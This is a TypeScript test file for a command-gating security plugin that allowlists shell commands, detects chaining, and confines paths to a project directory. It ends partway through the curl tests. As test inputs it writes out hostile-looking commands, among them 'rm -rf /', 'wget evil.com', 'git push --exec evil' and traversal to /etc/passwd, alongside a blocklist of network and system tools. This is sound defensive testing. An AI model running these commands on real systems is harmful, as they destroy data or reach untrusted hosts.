import { resolve, sep } from "path"
import { realpathSync, existsSync } from "fs"
import { describe, it, expect } from "vitest"
import { SecureAccessPlugin } from "./secure-access.plugin"

// --- Types ---

type ArgType = "path" | "flag" | "content" | "pattern"

interface ClassifiedArg {
  value: string
  type: ArgType
}

interface CommandRule {
  pattern: RegExp
  type: string
  validate?: (tokens: string[], classified: ClassifiedArg[]) => boolean
}

// --- Helpers ---

const VALIDATION_ERROR = "[secure-access] Blocked command validation"

const stripQuotedSegments = (cmd: string): string => cmd.replace(/(['"])(?:(?!\1|\\).|\\.)*\1/g, "")

// "2>&1" e "&>" duplicam descritor de saída, não encadeiam comandos
const stripFdDuplication = (cmd: string): string => cmd.replace(/&?\d?>&?\d?/g, "")

const hasChaining = (cmd: string): boolean => {
  const noQuotes = stripQuotedSegments(cmd)
  return /&&|\|\||;|\||&|`|\$\(|\$\{|\n|\r|%0A|%0D/.test(stripFdDuplication(noQuotes))
}

const safeRealPath = (target: string): string | null => {
  try {
    return realpathSync(target)
  } catch {
    return null
  }
}

const tokenize = (cmd: string): string[] => {
  const tokens: string[] = []
  let i = 0
  while (i < cmd.length) {
    if (cmd[i] === " " || cmd[i] === "\t") { i++; continue }

    let token = ""
    while (i < cmd.length) {
      const c = cmd[i]
      if (c === "'" || c === '"') {
        const quote = c
        i++
        while (i < cmd.length) {
          if (cmd[i] === quote) { i++; break }
          if (cmd[i] === "\\" && i + 1 < cmd.length && quote === '"') {
            token += cmd[i + 1]
            i += 2
          } else {
            token += cmd[i]
            i++
          }
        }
      } else if (c === " " || c === "\t") {
        i++
        break
      } else {
        token += c
        i++
      }
    }
    tokens.push(token)
  }
  return tokens
}

const nonFlagArgs = (tokens: string[]): string[] =>
  tokens.filter(t => !t.startsWith("-") && !t.startsWith("/"))

const classifyArg = (token: string): ClassifiedArg => {
  if (token.startsWith("-") || token.startsWith("/")) {
    return { value: token, type: "flag" }
  }
  if (/[*?[\]{}]/.test(token)) {
    return { value: token, type: "pattern" }
  }
  return { value: token, type: "path" }
}

// --- Scope extraction (comandos de leitura e argumentos de path do git) ---

const isCurrentDirToken = (token: string): boolean => token === "." || token === ""

const isPathLikeArg = (token: string): boolean => {
  if (classifyArg(token).type !== "flag") return true
  if (token === "/" || /^\\\\/.test(token)) return true
  return /^\//.test(token) && /[\\/]/.test(token.slice(1))
}

const freeTextValueFlags = new Set(["-m", "--message"])

const collectPathArgs = (tokens: string[]): string[] => {
  const paths: string[] = []
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i]
    if (freeTextValueFlags.has(token)) {
      i++
      continue
    }
    if (isPathLikeArg(token)) paths.push(token)
  }
  return paths
}

const readCommandTypes = new Set(["cat", "type", "ls", "get-content", "get-childitem", "test-path"])

// --- Redirecionamento, payloads entre aspas e comandos bloqueados ---

// Metadados de redirecionamento: > >> < 2> 2>> &>
const redirectPattern = /(?:^|[\s|(&])(?:\d|&)?(>>?|<<?)\s*("[^"]*"|'[^']*'|\S+)/g

const extractRedirectTargets = (cmd: string): string[] => {
  const targets: string[] = []
  for (const match of cmd.matchAll(redirectPattern)) {
    const target = match[2].replace(/^['"]|['"]$/g, "")
    // "&1" é duplicação de descritor (ex.: 2>&1), não um caminho
    if (!target || target.startsWith("&")) continue
    targets.push(target)
  }
  return targets
}

// Caminho absoluto (Windows/UNC) ou travessia ".." escondida dentro de um payload entre aspas
const embeddedPathPattern = /[A-Za-z]:\\[^\s"'`]+|\\\\[^\s"'`]+|(?:^|[\s"'`=])\.\.[\\/][^\s"'`]*/g
const rootSlashPattern = /(^|[\s"'`])\/(?=[\s"'`]|$)/g

// Valores de flags de texto livre (mensagem de commit) não são caminhos
const freeTextValuePattern = /(?:^|\s)(?:-m|--message)(?:=|\s+)("[^"]*"|'[^']*'|\S+)/g

const stripFreeTextValues = (cmd: string): string => cmd.replace(freeTextValuePattern, " ")

const extractEmbeddedPaths = (cmd: string): string[] => {
  const paths: string[] = []
  const scannable = stripFreeTextValues(cmd)
  for (const match of scannable.matchAll(embeddedPathPattern)) {
    paths.push(match[0].replace(/^[\s"'`=]+/, ""))
  }
  for (const _ of scannable.matchAll(rootSlashPattern)) {
    paths.push("/")
  }
  return paths
}

const blockedCommandTypes = new Set([
  "wget",
  "iwr",
  "irm",
  "iex",
  "invoke-webrequest",
  "invoke-restmethod",
  "invoke-expression",
  "invoke-command",
  "start-bitstransfer",
  "bitsadmin",
  "certutil",
  "mshta",
  "rundll32",
  "regsvr32",
  "scp",
  "reg",
  "net",
  "netsh",
  "sc",
  "taskkill",
  "stop-process",
  "start-process",
  "set-service",
  "restart-service",
  "new-service",
  "remove-service",
  "takeown",
  "icacls",
  "attrib",
  "cipher",
  "bcdedit",
  "diskpart",
  "format",
  "shutdown",
  "restart-computer",
  "stop-computer",
  "clear-eventlog",
  "wevtutil",
])

const scopedRunnerTypes = new Set(["npx-playwright", "vitest-run", "pnpm-run", "pnpm-exec"])

// Tipos em que o scan de paths embutidos não se aplica
const embeddedScanExemptTypes = new Set(["echo", "pnpm-pw-check"])

// Interpretadores com código inline (-c/-e/--eval) são shell disfarçado
const inlineEvalTypes = new Set([
  "bash",
  "sh",
  "zsh",
  "pwsh",
  "powershell",
  "cmd",
  "python",
  "python3",
  "py",
  "ruby",
  "perl",
  "osascript",
  "wscript",
  "cscript",
  "node",
])

const inlineEvalFlags = new Set(["-c", "-e", "--eval", "/c", "/k", "-command", "-encodedcommand"])

// Normaliza o executável: remove aspas, diretório e extensão (.\wget.exe -> wget)
const baseCommandName = (token: string): string => {
  const value = token.replace(/^['"]|['"]$/g, "")
  const base = value.split(/[\\/]/).pop() ?? ""
  return base.replace(/\.(exe|cmd|bat|ps1|com)$/i, "").toLowerCase()
}

// npx/pnpx/bunx/dlx e `pnpm|npm exec` executam outro comando
const launcherTypes = new Set(["npx", "pnpx", "bunx", "bun", "dlx", "yarn", "yarnpkg"])
const execWrapperSubcommands = new Set(["exec", "dlx"])

const resolveCommandSlice = (tokens: string[]): string[] => {
  if (tokens.length === 0) return tokens
  const name = baseCommandName(tokens[0])
  if (launcherTypes.has(name)) return tokens.slice(1)
  if ((name === "pnpm" || name === "npm") && execWrapperSubcommands.has((tokens[1] ?? "").toLowerCase())) {
    return tokens.slice(2)
  }
  return tokens
}

const hasInlineEval = (tokens: string[]): boolean => {
  const resolved = resolveCommandSlice(tokens)
  const commandType = resolved.length > 0 ? baseCommandName(resolved[0]) : ""
  if (!inlineEvalTypes.has(commandType)) return false
  return resolved.slice(1).some((t) => inlineEvalFlags.has(t.toLowerCase()))
}

const gitHandlers: Record<string, (classified: ClassifiedArg[]) => boolean> = {
  status: () => true,
  diff: () => true,
  log: () => true,
  add: (c) => c.some(a => a.type === "path"),
  commit: (c) => {
    const mIdx = c.findIndex(a => a.value === "-m" || a.value === "--message")
    if (mIdx === -1) return false
    return mIdx < c.length - 1
  },
  checkout: (c) => c.some(a => a.type !== "flag"),
  restore: (c) => c.some(a => a.type === "path"),
  push: (c) => !c.some(a => a.value.includes("--exec")),
  pull: () => false,
  branch: () => true,
  fetch: () => true,
  merge: (c) => !c.some(a => a.value.includes("--receive-pack")),
  rebase: () => true,
  stash: () => true,
  reset: () => true,
  show: () => true,
  tag: () => true,
  init: () => true,
  remote: () => true,
}

const commandRules: CommandRule[] = [
  { pattern: /^pnpm --filter (frontend|backend|@jobfindr\/types|@jobfindr\/utils)\s+(dev|build|start|lint|typecheck|test|preview|clean)$/i, type: "pnpm-filter" },
  { pattern: /^pnpm --filter backend exec tsx \.\.\/frontend\/playwright-check\.ts$/i, type: "pnpm-pw-check" },
  { pattern: /^pnpm install$/i, type: "pnpm-install" },
  { pattern: /^pnpm typecheck$/i, type: "pnpm-typecheck" },
  { pattern: /^pnpm lint$/i, type: "pnpm-lint" },
  { pattern: /^pnpm run\s+\S+(\s+.*)?$/i, type: "pnpm-run" },
  { pattern: /^pnpm test$/i, type: "pnpm-test" },
  { pattern: /^docker compose (up|down|build)$/i, type: "docker-compose" },
  { pattern: /^npx playwright .+$/i, type: "npx-playwright" },
  { pattern: /^(?:\.\\node_modules\\.bin\\)?vitest(?:\.(?:CMD|ps1))? run(?:\s+.*)?$/i, type: "vitest-run" },
  { pattern: /^powershell -c "\[System\.Console\]::Beep\(\d+, \d+\)"$/i, type: "powershell-beep" },
  {
    pattern: /^git\s+(\S+)(?:\s+.*)?$/i,
    type: "git",
    validate: (tokens, classified) => {
      const subcmd = tokens[1]?.toLowerCase()
      if (!subcmd || !gitHandlers[subcmd]) return false
      const rest = tokens.slice(2).join(" ")
      if (/&&|\|\||[;|]|`|\$\(|\$\{/.test(rest)) return false
      return gitHandlers[subcmd](classified.slice(2))
    },
  },
  {
    pattern: /^(node|tsx)\s+(\S+)/i,
    type: "exec",
    validate: (tokens) => {
      if (tokens.length < 2) return false
      if (tokens[1].startsWith("-")) return false
      for (const arg of tokens.slice(2)) {
        if (["-e", "--eval", "--require", "--inspect", "--inspect-brk"].includes(arg)) return false
      }
      return true
    },
  },
  { pattern: /^cd\s+(\S+)$/i, type: "cd" },
  { pattern: /^rm\s+(-[rf]+\s+)?(\S+)$/i, type: "rm" },
  { pattern: /^del\s+(\/[a-z]+\s+)?(\S+)$/i, type: "del" },
  { pattern: /^mkdir\s+(-p\s+)?(\S+)$/i, type: "mkdir" },
  { pattern: /^Remove-Item\s+(.+)$/i, type: "remove-item" },
  { pattern: /^Copy-Item\s+(.+)$/i, type: "copy-item" },
  { pattern: /^Move-Item\s+(.+)$/i, type: "move-item" },
  // cp/mv do shell (git bash) usam a mesma validação de origem/destino
  { pattern: /^(cp|mv)\s+(.+)$/i, type: "copy-item" },
  { pattern: /^Set-Content\s+(.+)$/i, type: "set-content" },
  { pattern: /^New-Item\s+(.+)$/i, type: "new-item" },
  { pattern: /^cat\s+\S+$/i, type: "cat" },
  { pattern: /^ls(?:\s+\S*)?$/i, type: "ls" },
  { pattern: /^which\s+\S+$/i, type: "which" },
  { pattern: /^where\s+\S+$/i, type: "where" },
  { pattern: /^echo\s+.+$/i, type: "echo" },
  { pattern: /^type\s+\S+$/i, type: "type" },
  { pattern: /^Get-ChildItem\s+.+$/i, type: "get-childitem" },
  { pattern: /^Get-Content\s+.+$/i, type: "get-content" },
  { pattern: /^Get-Command\s+.+$/i, type: "get-command" },
  { pattern: /^Test-Path\s+.+$/i, type: "test-path" },
  { pattern: /^rm\s+-rf\s+node_modules$/i, type: "rm-node-modules" },
  { pattern: /^Stop-Process\s+-Name\s+(node|tsx)(\s+-Force)?$/i, type: "stop-process" },
  { pattern: /^taskkill\s+\/F\s+\/IM\s+(node|tsx)(\.exe)?$/i, type: "stop-process" },
  {
    pattern: /^curl\s+/i,
    type: "curl",
    validate: (tokens) => {
      const args = tokens.slice(1)
      const dangerousFlags = ["-o", "--output", "-O", "--remote-name", "--config", "-K", "--help", "--manual"]
      for (const arg of args) {
        if (dangerousFlags.includes(arg)) return false
      }
      const url = args.find(a => a.startsWith("http"))
      if (!url) return false
      return /localhost/i.test(url)
    },
  },
]

const normalizeCommand = (cmd: string): string => {
  if (/^rtk\s+git(?:\s+|$)/i.test(cmd)) {
    return cmd.replace(/^rtk\s+/i, "")
  }
  return cmd
}

const parseCommand = (cmd: string): { type: string; args: string[] } | null => {
  cmd = normalizeCommand(cmd)
  for (const rule of commandRules) {
    const match = cmd.match(rule.pattern)
    if (match) {
      if (rule.validate) {
        const tokens = tokenize(cmd)
        const classified = tokens.map(classifyArg)
        if (!rule.validate(tokens, classified)) {
          throw new Error(`${VALIDATION_ERROR}:\n${cmd}`)
        }
      }
      const args = match.slice(1).filter((a): a is string => a !== undefined)
      return { type: rule.type, args }
    }
  }
  return null
}

export const createPathValidator = (projectDir: string) => {
  const projectRoot = resolve(projectDir)
  const projectReal = safeRealPath(projectRoot)
  const projectBoundary = projectReal === null ? null : projectReal + sep

  return (target: string): boolean => {
    if (projectBoundary === null) return false

    if (/^\\\\/.test(target)) return false
    if (target === "" || target === "." || target === "..") return false

    const resolved = resolve(projectRoot, target)
    const real = safeRealPath(resolved)
    if (real === null) {
      return resolved.startsWith(projectBoundary) || resolved === projectReal
    }
    return real.startsWith(projectBoundary) || real === projectReal
  }
}

// --- Helpers for exec handler tests ---

const VALID_SCRIPT_EXT = /\.(ts|js|tsx|mjs|cjs)$/i
const DANGEROUS_SCRIPT_EXT = /\.(exe|com|bat|ps1|sh|dll)$/i

const resolveScript = (directory: string, base: string, scriptArg: string): string | null => {
  const fullPath = resolve(directory, base, scriptArg)
  if (existsSync(fullPath)) return safeRealPath(fullPath)
  return null
}

// Escopo da pasta atual: "." (pasta atual) é válido, o resto passa pelo prefixo
const createScopeValidator = (projectDir: string) => {
  const isInside = createPathValidator(projectDir)
  return (target: string): boolean => isCurrentDirToken(target) || isInside(target)
}

// ==============================
// Tests
// ==============================

describe("hasChaining", () => {
  it("allows simple commands", () => {
    expect(hasChaining("git status")).toBe(false)
    expect(hasChaining("pnpm install")).toBe(false)
    expect(hasChaining("ls -la")).toBe(false)
  })

  it("blocks &&", () => {
    expect(hasChaining("git status && whoami")).toBe(true)
    expect(hasChaining("pnpm install && rm -rf /")).toBe(true)
  })

  it("blocks ||", () => { expect(hasChaining("cd src || exit")).toBe(true) })
  it("blocks ;", () => { expect(hasChaining("pnpm install ; rm -rf /")).toBe(true) })
  it("blocks pipe |", () => { expect(hasChaining("git status | cat")).toBe(true) })
  it("blocks backtick", () => { expect(hasChaining("echo `whoami`")).toBe(true) })
  it("blocks $()", () => { expect(hasChaining("echo $(whoami)")).toBe(true) })
  it("blocks ${}", () => { expect(hasChaining("echo ${HOME}")).toBe(true) })
})

// --- Fase 28: Pipes inside strings should be allowed ---
describe("hasChaining (quote-aware)", () => {
  it("allows pipes inside quoted strings", () => {
    expect(hasChaining(`echo "a|b"`)).toBe(false)
    expect(hasChaining(`echo 'a|b'`)).toBe(false)
  })

  it("allows && inside quoted strings", () => {
    expect(hasChaining(`echo "a && b"`)).toBe(false)
  })

  it("still blocks real pipes outside quotes", () => {
    expect(hasChaining(`echo "a" | cat`)).toBe(true)
  })

  it("allows $() inside double quotes", () => {
    expect(hasChaining(`echo "$(echo hello)"`)).toBe(false)
  })
})

describe("parseCommand", () => {
  describe("returns type for allowed commands", () => {
    const ok = (cmd: string, expectedType: string) =>
      it(cmd, () => expect(parseCommand(cmd)?.type).toBe(expectedType))

    ok("pnpm install", "pnpm-install")
    ok("pnpm typecheck", "pnpm-typecheck")
    ok("pnpm lint", "pnpm-lint")
    ok("pnpm run dev", "pnpm-run")
    ok("pnpm run typecheck", "pnpm-run")
    ok("pnpm --filter frontend dev", "pnpm-filter")
    ok("pnpm --filter backend build", "pnpm-filter")
    ok("docker compose up", "docker-compose")
    ok("npx playwright test", "npx-playwright")
    ok("vitest run", "vitest-run")
    ok('powershell -c "[System.Console]::Beep(800, 300)"', "powershell-beep")
    ok("git status", "git")
    ok("git diff", "git")
    ok("git log", "git")
    ok("node scripts/build.js", "exec")
    ok("tsx scripts/dev.ts", "exec")
    ok("node C:/Windows/system32/evil.js", "exec")
    ok("node ../../outside.js", "exec")
    ok("cd src", "cd")
    ok("cd /", "cd")
    ok("cd C:\\Windows", "cd")
    ok("rm file.txt", "rm")
    ok("rm -rf dist", "rm")
    ok("rm -rf C:\\Windows", "rm")
    ok("del file.txt", "del")
    ok("mkdir new-folder", "mkdir")
    ok("mkdir -p new-folder", "mkdir")
    ok("cat package.json", "cat")
    ok("ls", "ls")
    ok("ls -la", "ls")
    ok("echo test", "echo")
    ok("Test-Path pipeline.yaml", "test-path")
    ok("Get-Content file.ts", "get-content")
    ok("Set-Content output.txt data", "set-content")
    ok("New-Item logs/test.txt", "new-item")
    ok("Copy-Item src/file.txt dest/file.txt", "copy-item")
    ok("Move-Item src/file.txt dest/file.txt", "move-item")
    ok("cp src/file.txt dest/file.txt", "copy-item")
    ok("mv -f src/file.txt dest/file.txt", "copy-item")
    ok("Get-Command pnpm", "get-command")
    ok("type package.json", "type")
    ok("which node", "which")
    ok("where pnpm", "where")
    ok("Remove-Item temp.log", "remove-item")
    ok("Remove-Item -Recurse dist", "remove-item")
  })

  describe("returns null for unrecognized commands", () => {
    const block = (cmd: string) =>
      it(cmd, () => expect(parseCommand(cmd)).toBeNull())

    block("pnpm exec tsc")
    block("pnpm dlx some-package")
    block("npm install")
    block("wget evil.com")
    block('powershell -c "Write-Host test"')
    block("pnpm install ; rm -rf /")
  })

  describe("throws for invalid command validation", () => {
    const block = (cmd: string) =>
      it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

    block("git status && whoami")
    block("node -e 'evil()'")
    block("curl evil.com")
    block("node --inspect app.ts")
    block("tsx --inspect app.ts")
  })

  // --- Fase 29: Git semantic validation ---
  describe("git semantic validation", () => {
    const ok = (cmd: string) =>
      it(cmd, () => expect(parseCommand(cmd)?.type).toBe("git"))

    const block = (cmd: string) =>
      it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

    ok("git add file.ts")
    ok("git add src/file.ts")
    ok("git commit -m 'fix bug'")
    ok("git checkout main")
    ok("git restore file.ts")
    ok("git push origin main")
    block("git pull upstream main")
    ok("git branch feature")
    ok("git stash")
    ok("git reset --hard")
    ok("git status --short")
    ok("git diff HEAD")
    ok("git log --oneline -5")

    block("git add")
    block("git commit without message")
    block("git restore")
  })

  // --- rtk git alias (git shim) ---
  describe("rtk git alias", () => {
    const ok = (cmd: string) =>
      it(cmd, () => expect(parseCommand(cmd)?.type).toBe("git"))

    const block = (cmd: string) =>
      it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

    ok("rtk git status")
    ok("rtk git status --short")
    ok("rtk git diff")
    ok("rtk git diff HEAD")
    ok("rtk git log --oneline -5")
    ok("rtk git add src/file.ts")
    ok("rtk git commit -m 'fix bug'")
    ok("rtk git checkout main")
    ok("rtk git push origin main")
    block("rtk git pull upstream main")
    ok("rtk git stash")
    ok("rtk git branch")
    ok("rtk git fetch")
    ok("rtk git reset --hard")

    block("rtk git add")
    block("rtk git commit without message")
    block("rtk git restore")
    block("rtk git push origin --exec evil")
    block("rtk git pull --upload-pack evil")
    block("rtk git pull")
  })

  // --- Fase 27: Node/TSX flag blocking ---
  describe("node/tsx flag blocking", () => {
    const block = (cmd: string) =>
      it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

    block("node -e 'console.log(1)'")
    block("node --eval 'console.log(1)'")
    block("node --require x.js app.js")
    block("tsx --inspect app.ts")
    block("tsx -e 'code'")
  })

  // --- Fase 30: Structured parsing ensures determinism ---
  describe("structured command parsing", () => {
    it("identifies command type and args", () => {
      const result = parseCommand("git commit -m 'hello'")
      expect(result?.type).toBe("git")
      expect(result?.args.length).toBeGreaterThan(0)
    })

    it("rejects unknown commands", () => {
      expect(parseCommand("sudo rm -rf /")).toBeNull()
      expect(parseCommand("start evil.exe")).toBeNull()
    })
  })
})

describe("createPathValidator", () => {
  const isInside = createPathValidator(__dirname)

  it("allows relative paths inside project", () => {
    expect(isInside("./secure-access.test.ts")).toBe(true)
    expect(isInside("secure-access.test.ts")).toBe(true)
  })

  it("allows absolute paths inside project", () => {
    expect(isInside(__filename)).toBe(true)
  })

  it("blocks paths with .. outside project", () => {
    expect(isInside("../../../../etc/passwd")).toBe(false)
    expect(isInside("../../../outside/file.txt")).toBe(false)
  })

  it("blocks absolute paths outside project", () => {
    const platform = process.platform
    if (platform === "win32") {
      expect(isInside("C:\\Windows\\System32")).toBe(false)
    } else {
      expect(isInside("/etc/passwd")).toBe(false)
    }
  })

  it("allows non-existent paths inside project (resolved prefix fallback)", () => {
    expect(isInside("./nonexistent-folder/new-file.ts")).toBe(true)
    expect(isInside("temp-dir/output.log")).toBe(true)
  })

  // --- Fase 32: UNC paths ---
  describe("UNC path blocking", () => {
    it("blocks UNC paths", () => {
      expect(isInside("\\\\server\\share\\file.txt")).toBe(false)
      expect(isInside("\\\\evil-server\\share\\malware.exe")).toBe(false)
    })
  })
})

describe("classifyArg", () => {
  it("classifies flags", () => {
    expect(classifyArg("-r")).toEqual({ value: "-r", type: "flag" })
    expect(classifyArg("--recursive")).toEqual({ value: "--recursive", type: "flag" })
    expect(classifyArg("/r")).toEqual({ value: "/r", type: "flag" })
  })

  it("classifies paths", () => {
    expect(classifyArg("src/file.txt")).toEqual({ value: "src/file.txt", type: "path" })
    expect(classifyArg("./index.ts")).toEqual({ value: "./index.ts", type: "path" })
  })

  it("classifies glob patterns", () => {
    expect(classifyArg("*.ts")).toEqual({ value: "*.ts", type: "pattern" })
    expect(classifyArg("src/**/*.ts")).toEqual({ value: "src/**/*.ts", type: "pattern" })
  })
})

describe("tokenize + nonFlagArgs", () => {
  it("splits by whitespace respecting quotes (quotes stripped)", () => {
    expect(tokenize(`Remove-Item -Recurse -Path 'C:\\path\\file.txt'`)).toEqual([
      "Remove-Item", "-Recurse", "-Path", "C:\\path\\file.txt"
    ])
  })

  it("handles double-quoted strings with spaces", () => {
    expect(tokenize(`Set-Content output.txt "hello world"`)).toEqual([
      "Set-Content", "output.txt", "hello world"
    ])
  })

  it("handles escaped quotes in double-quoted strings", () => {
    expect(tokenize(`echo "hello \\"world\\""`)).toEqual([
      "echo", 'hello "world"'
    ])
  })

  it("handles simple tokens without quotes", () => {
    expect(tokenize(`git status`)).toEqual(["git", "status"])
    expect(tokenize(`rm -rf dist`)).toEqual(["rm", "-rf", "dist"])
  })

  it("nonFlagArgs filters flags", () => {
    const tokens = tokenize(`Remove-Item -Recurse -Force dist`)
    expect(nonFlagArgs(tokens)).toEqual(["Remove-Item", "dist"])
  })
})

// --- Fase 52: hasChaining with escape-aware regex ---
describe("hasChaining (escape-aware Fase 52)", () => {
  it("allows escaped quotes inside double-quoted strings", () => {
    expect(hasChaining(`echo "a \\" b" | cat`)).toBe(true)
  })

  it("allows pipes inside double-quoted strings with escapes", () => {
    expect(hasChaining(`echo "inner \\"|\\" pipe"`)).toBe(false)
  })

  it("still blocks real pipes outside quotes", () => {
    expect(hasChaining(`echo "hello" | cat`)).toBe(true)
    expect(hasChaining(`echo 'hello' | cat`)).toBe(true)
  })

  it("allows chaining operators inside strings", () => {
    expect(hasChaining(`echo "a && b"`)).toBe(false)
    expect(hasChaining(`echo 'a && b'`)).toBe(false)
  })
})

// --- Fase 45: Security tests ---

describe("safeRealPath fail-closed (Fase 34)", () => {
  it("returns real path for existing paths", () => {
    const result = safeRealPath(__filename)
    expect(result).not.toBeNull()
    expect(typeof result).toBe("string")
  })

  it("returns null for non-existent paths", () => {
    expect(safeRealPath("./nonexistent-mkdir-test")).toBeNull()
    expect(safeRealPath("C:\\nonexistent-drive\\file.txt")).toBeNull()
  })
})

describe("git semantic validation - edge cases (Fase 36)", () => {
  const block = (cmd: string) =>
    it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

  block("git commit -m")
  block("git commit --message")
})

describe("mkdir with multiple args (Fase 37)", () => {
  const block = (cmd: string) =>
    it(cmd, () => expect(parseCommand(cmd)).toBeNull())

  block("mkdir a b")
  block("mkdir -p a b")
})

describe("node/tsx with flags (Fase 37)", () => {
  const ok = (cmd: string) =>
    it(cmd, () => expect(parseCommand(cmd)?.type).toBe("exec"))

  ok("node a.js b.js")
  ok("tsx a.ts b.ts")
  ok("node scan.mjs --mode docs")
})

describe("createPathValidator fallback (Fase 34 non-existent paths)", () => {
  const isInside = createPathValidator(__dirname)

  it("allows non-existent paths inside project (resolved prefix fallback)", () => {
    expect(isInside("./nonexistent-file.xyz")).toBe(true)
    expect(isInside("nonexistent-dir/new-file.txt")).toBe(true)
  })

  it("still blocks absolute paths outside project", () => {
    const platform = process.platform
    if (platform === "win32") {
      expect(isInside("C:\\Windows\\System32\\evil.exe")).toBe(false)
    } else {
      expect(isInside("/etc/passwd")).toBe(false)
    }
  })

  it("still blocks UNC paths", () => {
    expect(isInside("\\\\server\\share\\file")).toBe(false)
  })
})

describe("classifyArg enforcement (Fase 42)", () => {
  it("classifies -Path flag, not as path", () => {
    expect(classifyArg("-Path")).toEqual({ value: "-Path", type: "flag" })
  })

  it("classifies /Recurse flag, not as path", () => {
    expect(classifyArg("/Recurse")).toEqual({ value: "/Recurse", type: "flag" })
  })

  it("classifies destination path correctly", () => {
    expect(classifyArg("./dest/file.txt")).toEqual({ value: "./dest/file.txt", type: "path" })
  })
})

// --- Fase 56: Security test suite ---

describe("Fase 56: filesystem escape tests", () => {
  const isInside = createPathValidator(__dirname)

  it("blocks path traversal via ../..", () => {
    expect(isInside("../../../../etc/passwd")).toBe(false)
    expect(isInside("../../../outside")).toBe(false)
  })

  it("blocks UNC paths", () => {
    expect(isInside("\\\\server\\share\\file")).toBe(false)
  })

  it("blocks empty and dot-only paths", () => {
    expect(isInside("")).toBe(false)
    expect(isInside(".")).toBe(false)
    expect(isInside("..")).toBe(false)
  })

  it("allows existing files inside project", () => {
    expect(isInside(__filename)).toBe(true)
    expect(isInside("./secure-access.test.ts")).toBe(true)
  })
})

describe("Fase 56: exec security tests", () => {
  const block = (cmd: string) =>
    it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

  block("node -e 'evil()'")
})

describe("Fase 56: git semantic security tests", () => {
  const block = (cmd: string) =>
    it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

  block("git commit -m")
  block("git commit --message")
})

describe("Fase 56: shell chaining security tests", () => {
  it("blocks real pipes outside quotes", () => {
    expect(hasChaining("git status | cat")).toBe(true)
    expect(hasChaining("echo a | cat")).toBe(true)
  })

  it("allows pipes inside quoted strings", () => {
    expect(hasChaining(`echo "a|b"`)).toBe(false)
    expect(hasChaining(`echo 'a|b'`)).toBe(false)
  })

  it("allows operators inside quoted strings with escapes", () => {
    expect(hasChaining(`echo "inner \\"|\\" pipe"`)).toBe(false)
  })

  it("blocks multiline chaining operators", () => {
    expect(hasChaining("echo a && echo b")).toBe(true)
    expect(hasChaining("echo a || echo b")).toBe(true)
    expect(hasChaining("echo a ; echo b")).toBe(true)
  })
})

describe("Fase 56: tokenizer determinism tests", () => {
  it("handles paths with spaces inside quotes", () => {
    expect(tokenize(`Copy-Item "source path/file.txt" dest/`)).toEqual([
      "Copy-Item", "source path/file.txt", "dest/"
    ])
  })

  it("handles single-quoted strings", () => {
    expect(tokenize(`echo 'hello world'`)).toEqual(["echo", "hello world"])
  })

  it("handles escaped double quotes inside double-quoted strings", () => {
    const result = tokenize('echo "hello \\"world\\""')
    expect(result).toEqual(["echo", 'hello "world"'])
  })

  it("handles consecutive whitespace", () => {
    expect(tokenize(`git   status`)).toEqual(["git", "status"])
  })

  it("handles leading/trailing whitespace", () => {
    expect(tokenize(`  git status  `)).toEqual(["git", "status"])
  })
})

describe("Fase 56: hasChaining newline and encoding detection", () => {
  it("blocks \\n in command", () => {
    expect(hasChaining("echo a\necho b")).toBe(true)
  })

  it("blocks \\r in command", () => {
    expect(hasChaining("echo a\recho b")).toBe(true)
  })

  it("blocks %0A url-encoded newline", () => {
    expect(hasChaining("echo a%0Aecho b")).toBe(true)
  })

  it("blocks %0D url-encoded carriage return", () => {
    expect(hasChaining("echo a%0Decho b")).toBe(true)
  })

  it("allows normal commands without encoding", () => {
    expect(hasChaining("git status")).toBe(false)
  })
})

describe("Fase 56: git dangerous flag blocking", () => {
  const block = (cmd: string) =>
    it(cmd, () => expect(() => parseCommand(cmd)).toThrow(VALIDATION_ERROR))

  block("git push origin --exec evil")
  block("git pull --upload-pack evil")
  block("git merge --receive-pack evil")
  block("git pull")
})

describe("Fase 56: command normalization", () => {
  it("normalizes URL-encoded and Unicode forms", () => {
    // %2F => /
    expect(tokenize(decodeURIComponent("git%20add%20file.ts"))).toEqual(["git", "add", "file.ts"])
  })
})

describe("Fase 56: glob/grep path hardening", () => {
  it("blocks paths with ..", () => {
    const isInside = createPathValidator(__dirname)
    expect(isInside("../outside")).toBe(false)
    expect(isInside("some/../../outside")).toBe(false)
  })

  it("blocks absolute paths (starts with /)", () => {
    const isInside = createPathValidator(__dirname)
    expect(isInside("/etc/passwd")).toBe(false)
    expect(isInside("/var/log")).toBe(false)
  })

  it("allows relative project paths", () => {
    const isInside = createPathValidator(__dirname)
    expect(isInside(__filename)).toBe(true)
  })
})

describe("Fase 56: createPathValidator boundary fallback", () => {
  it("allows exact project boundary match via real === projectReal", () => {
    const isInside = createPathValidator(__dirname)
    // __dirname should resolve to itself or a parent; exact match allowed
    expect(isInside(__dirname)).toBe(true)
  })
})

// --- decodeURIComponent bug fix ---
describe("decodeURIComponent safe handling", () => {
  it("handles malformed percent encoding without crashing", () => {
    const normalized = (() => {
      try { return decodeURIComponent("echo 100% done") } catch { return "echo 100% done" }
    })()
    expect(normalized).toBe("echo 100% done")
  })
})

// --- Stop-Process / taskkill ---
describe("process kill commands", () => {
  it("allows Stop-Process -Name node", () => {
    expect(parseCommand("Stop-Process -Name node")?.type).toBe("stop-process")
  })
  it("allows Stop-Process -Name tsx -Force", () => {
    expect(parseCommand("Stop-Process -Name tsx -Force")?.type).toBe("stop-process")
  })
  it("allows taskkill /F /IM node.exe", () => {
    expect(parseCommand("taskkill /F /IM node.exe")?.type).toBe("stop-process")
  })
  it("blocks Stop-Process with invalid process name", () => {
    expect(parseCommand("Stop-Process -Name svchost")).toBeNull()
  })
})

// --- curl localhost ---
describe("curl localhost tests", () => {
  it("allows curl http://localhost:3001/api", () => {
    expect(parseCommand("curl http://localhost:3001/api")?.type).toBe("curl")
  })
  it("allows curl -s http://localhost:3001", () => {
    expect(parseCommand("curl -s http://localhost:3001")?.type).toBe("curl")
  })
  it("blocks curl to external URLs", () => {
